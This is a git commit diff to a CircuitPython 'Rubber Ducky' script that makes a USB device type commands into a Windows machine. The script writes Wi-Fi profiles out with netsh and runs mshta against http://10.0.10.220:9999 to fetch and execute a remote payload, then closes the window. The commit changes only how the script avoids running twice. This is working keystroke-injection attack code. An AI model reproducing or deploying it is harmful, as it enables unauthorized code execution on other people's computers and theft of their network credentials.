f5c1624ad85ebd6130b08790b7eec8486da7cc1f
Toshy-Shimura <82123083+Toshy-Shimura@users.noreply.github.com>
2023-05-16 17:21:07 +0000

    Update code.py

--- Rubber Ducky/code.py
+++ Rubber Ducky/code.py
@@ -5,10 +5,9 @@ from adafruit_hid.keycode import Keycode
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 
-finish = False
 time.sleep(3)
 
-if not finish:
+if not 'network.txt' in os.listdir():
     time.sleep(1.5)
     keyboard = Keyboard(usb_hid.devices)
     layout = KeyboardLayoutUS(keyboard)
@@ -23,6 +22,4 @@ if not finish:
     layout.write("netsh wlan show profile > network.txt\n")
     time.sleep(3)
     layout.write("mshta mshta http://10.0.10.220:9999/UL9J5")
-  
     keyboard.send(Keycode.ALT, Keycode.F4)
-    finish = True
